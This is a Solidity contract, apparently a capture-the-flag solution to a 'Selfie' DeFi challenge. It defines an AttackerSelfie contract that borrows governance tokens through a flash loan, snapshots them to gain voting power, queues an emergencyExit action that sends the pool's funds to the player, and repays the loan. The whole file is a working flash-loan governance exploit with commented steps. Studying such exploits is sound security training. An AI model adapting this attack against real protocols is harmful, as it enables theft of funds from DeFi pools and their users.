// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ISimpleGovernance.sol";

interface IPool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256);
}

contract AttackerSelfie is IERC3156FlashBorrower {
    ISimpleGovernance public governance;
    IPool public pool;
    IERC20Snapshot public token;

    address public player;

    constructor(address _pool, address _governance, address _token, address _player) {
        governance = ISimpleGovernance(_governance);
        pool = IPool(_pool);
        token = IERC20Snapshot(_token);

        player = _player;
    }

    function attack(uint256 _amount) public {
        // 1. Create malicious data pre-flashloan
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), _amount, data);
    }

    function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata data) external returns (bytes32) {
        require(msg.sender == address(pool), "msg.sender is not pool");
        require(tx.origin == player, "tx.origin is not player");

        // 2. Perform a snapshot so that our balance is saved
        token.snapshot();

        // 3. Queue malicious action upon getting to flashloan callback
        governance.queueAction(address(pool), 0, data);

        // 4. Allow pool to pull funds post-flashloan (req in flashLoan function)
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
